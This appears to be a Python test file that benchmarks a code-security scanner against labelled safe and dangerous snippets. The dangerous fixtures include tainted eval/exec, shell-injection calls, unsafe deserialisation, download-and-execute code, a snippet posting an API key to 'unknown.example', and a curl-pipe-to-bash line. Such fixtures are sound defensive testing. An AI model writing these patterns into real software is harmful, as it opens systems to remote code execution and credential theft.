import unittest

from main import analyze_code


SAFE_CASES = [
    ("python_print", "python", "Print a greeting", "print('hello')"),
    ("python_comment", "python", "Print a greeting", "# eval(user_input)\nprint('hello')"),
    ("python_docstring", "python", "Document a helper", 'def helper():\n    """Never run os.system(user_input)."""\n    return True'),
    ("python_fixed_get", "python", "Fetch public JSON", 'import requests\nrequests.get("https://example.com/data", timeout=5)'),
    ("python_fixed_post", "python", "Post JSON to an expected API", 'import requests\nrequests.post("https://example.com/data", json={"ok": True})'),
    ("python_fixed_process", "python", "Run a fixed local command", 'import subprocess\nsubprocess.run(["git", "status"], check=True)'),
    ("python_fixed_process_variable", "python", "Run a fixed local command", 'import subprocess\ncmd = ["git", "status"]\nsubprocess.run(cmd, check=True)'),
    ("python_process_format", "python", "Format a command for display", 'import subprocess\nprint(subprocess.list2cmdline(["git", "status"]))'),
    ("python_safe_yaml", "python", "Read a trusted YAML config", 'import yaml\nwith open("config.yml") as stream:\n    config = yaml.load(stream, Loader=yaml.SafeLoader)'),
    ("python_safe_load", "python", "Read a trusted YAML config", 'import yaml\nconfig = yaml.safe_load("enabled: true")'),
    ("python_json", "python", "Parse local JSON", 'import json\nvalue = json.loads("{\\"ok\\": true}")'),
    ("python_base64", "python", "Decode a documented data token", 'import base64\nvalue = base64.b64decode("aGVsbG8=")\nprint(value)'),
    ("python_path_read", "python", "Read a local report", 'from pathlib import Path\ntext = Path("report.txt").read_text()'),
    ("python_fixed_open", "python", "Read a local report", 'with open("report.txt") as file:\n    print(file.read())'),
    ("python_nonsecret_env", "python", "Read an application setting", 'import os\nregion = os.getenv("APP_REGION", "us-east")\nprint(region)'),
    ("python_expected_auth", "python", "Call the OpenAI API with an API key", 'import os, requests\ntoken = os.getenv("OPENAI_API_KEY")\nrequests.post("https://api.openai.com/v1/responses", headers={"Authorization": f"Bearer {token}"})'),
    ("javascript_fixed_fetch", "javascript", "Fetch public JSON", 'const result = await fetch("https://example.com/data");'),
    ("javascript_import_only", "javascript", "Import a process helper", 'const childProcess = require("child_process");\nconsole.log("ready");'),
    ("javascript_base64", "javascript", "Decode a display value", 'const value = atob("aGVsbG8=");\nconsole.log(value);'),
    ("typescript_type", "typescript", "Describe a session", 'type Session = { token: string; active: boolean };\nconst active = true;'),
    ("shell_echo", "shell", "Print a greeting", '#!/bin/sh\necho "hello"'),
    ("shell_fixed_curl", "shell", "Download a public status file", 'curl https://example.com/status.txt -o status.txt'),
    ("sql_select", "sql", "Read active user identifiers", 'SELECT id FROM users WHERE active = TRUE;'),
    ("html_page", "html", "Render a heading", '<main><h1>Audit complete</h1></main>'),
    ("css_style", "css", "Style a status badge", '.status { color: green; font-weight: 700; }'),
    ("java_helper", "java", "Return a greeting", 'class Hello { static String greeting() { return "hello"; } }'),
    ("go_helper", "go", "Return a greeting", 'package main\nfunc greeting() string { return "hello" }'),
    ("rust_helper", "rust", "Return a greeting", 'fn greeting() -> &\'static str { "hello" }'),
]


DANGEROUS_CASES = [
    ("python_tainted_eval", "python", "Display user input", 'value = input("Value: ")\nprint(eval(value))', {"red"}),
    ("python_tainted_exec", "python", "Display user input", 'value = input("Value: ")\nexec(value)', {"red"}),
    ("python_os_system", "python", "Print a filename", 'import os\nname = input("File: ")\nos.system(f"cat {name}")', {"red"}),
    ("python_shell_true", "python", "Print a filename", 'import subprocess\nname = input("File: ")\nsubprocess.run(f"cat {name}", shell=True)', {"red"}),
    ("python_pickle", "python", "Read uploaded data", 'import pickle\npayload = input("Data: ")\nvalue = pickle.loads(payload)', {"red"}),
    ("python_marshal", "python", "Read uploaded data", 'import marshal\npayload = input("Data: ")\nvalue = marshal.loads(payload)', {"red"}),
    ("python_yaml", "python", "Read uploaded YAML", 'import yaml\npayload = input("YAML: ")\nvalue = yaml.load(payload)', {"yellow", "red"}),
    ("python_dill", "python", "Read uploaded data", 'import dill\npayload = input("Data: ")\nvalue = dill.loads(payload)', {"red"}),
    ("python_dynamic_import", "python", "Load a user-selected plugin", 'name = input("Plugin: ")\nmodule = __import__(name)', {"yellow", "red"}),
    ("python_dynamic_request", "python", "Render a local message", 'import requests\nurl = input("URL: ")\nrequests.get(url)', {"yellow", "red"}),
    ("python_secret_exfil", "python", "Build a local report", 'import os, requests\nkey = os.getenv("OPENAI_API_KEY")\nrequests.post("https://unknown.example/log", json={"key": key})', {"red"}),
    ("python_download_exec", "python", "Download JSON", 'import requests\npayload = requests.get("https://example.com/payload").text\nexec(payload)', {"red"}),
    ("python_base64_exec", "python", "Decode display data", 'import base64\npayload = base64.b64decode(input("Data: "))\nexec(payload)', {"red"}),
    ("python_hex_exec", "python", "Decode display data", 'payload = bytes.fromhex(input("Data: "))\nexec(payload)', {"red"}),
    ("hardcoded_api_key", "python", "Print a greeting", 'key = "sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456"\nprint("hello")', {"yellow", "red"}),
    ("hardcoded_aws_key", "python", "Print a greeting", 'key = "AKIAABCDEFGHIJKLMNOP"\nprint("hello")', {"yellow", "red"}),
    ("private_key", "config", "Store a public setting", 'PRIVATE = "-----BEGIN PRIVATE KEY-----"', {"red"}),
    ("javascript_eval", "javascript", "Show the current URL", 'const code = window.location.hash.slice(1);\neval(code);', {"red"}),
    ("javascript_process_exec", "javascript", "Return a request value", 'const cmd = req.body.command;\nchild_process.exec(cmd);', {"yellow", "red"}),
    ("javascript_dynamic_fetch", "javascript", "Render a local message", 'const url = req.query.url;\nconst value = await fetch(url);', {"yellow", "red"}),
    ("javascript_atob_eval", "javascript", "Decode display data", 'const payload = atob(req.body.data);\neval(payload);', {"red"}),
    ("php_eval", "php", "Print a request value", '$code = $_GET["code"];\neval($code);', {"red"}),
    ("shell_download_pipe", "shell", "Download a file", 'curl https://unknown.example/install.sh | bash', {"red"}),
]


def benchmark_metrics():
    safe_results = [(name, analyze_code(intent, code)) for name, _, intent, code in SAFE_CASES]
    dangerous_results = [
        (name, expected, analyze_code(intent, code))
        for name, _, intent, code, expected in DANGEROUS_CASES
    ]
    false_positives = [name for name, result in safe_results if result["risk"] != "green"]
    missed = [name for name, expected, result in dangerous_results if result["risk"] not in expected]
    detected = [name for name, _, result in dangerous_results if result["risk"] in {"yellow", "red"}]
    languages = {case[1] for case in SAFE_CASES + DANGEROUS_CASES}
    return {
        "cases": len(SAFE_CASES) + len(DANGEROUS_CASES),
        "safe_cases": len(SAFE_CASES),
        "dangerous_cases": len(DANGEROUS_CASES),
        "false_positives": false_positives,
        "missed_expectations": missed,
        "false_positive_rate": len(false_positives) / len(SAFE_CASES),
        "dangerous_recall": len(detected) / len(DANGEROUS_CASES),
        "language_count": len(languages),
    }


class ScannerBenchmarkTests(unittest.TestCase):
    def test_benchmark_is_broad_enough(self):
        metrics = benchmark_metrics()
        self.assertGreaterEqual(metrics["cases"], 50, metrics)
        self.assertGreaterEqual(metrics["language_count"], 8, metrics)

    def test_safe_false_positive_rate_is_below_five_percent(self):
        metrics = benchmark_metrics()
        self.assertLessEqual(metrics["false_positive_rate"], 0.05, metrics)

    def test_dangerous_case_recall_is_at_least_ninety_percent(self):
        metrics = benchmark_metrics()
        self.assertGreaterEqual(metrics["dangerous_recall"], 0.90, metrics)

    def test_each_dangerous_case_meets_its_expected_risk(self):
        metrics = benchmark_metrics()
        self.assertEqual(metrics["missed_expectations"], [], metrics)


if __name__ == "__main__":
    unittest.main()
